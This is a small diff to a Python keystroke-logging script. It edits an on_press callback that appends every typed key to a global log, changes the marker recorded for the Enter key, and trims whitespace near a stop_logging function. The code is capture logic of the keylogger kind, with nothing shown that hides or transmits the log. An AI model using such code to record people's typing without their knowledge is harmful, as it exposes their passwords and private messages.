@@ -5,14 +5,14 @@ listener = None
 
 def on_press(key):
     global log
-    
+
     if hasattr(key,"char") and key.char is not None:
         log+=key.char
     else:
         if key == Key.space:
             log += " "  
         elif key == Key.enter:
-            log += " --\-- "  
+            log += " -[enter]- "  
         elif key == Key.backspace:
             log = log[:-1]                
 
@@ -33,9 +33,3 @@ def stop_logging():
         listener.stop()
         listener = None
     return log
-    
-
-
-
-
-
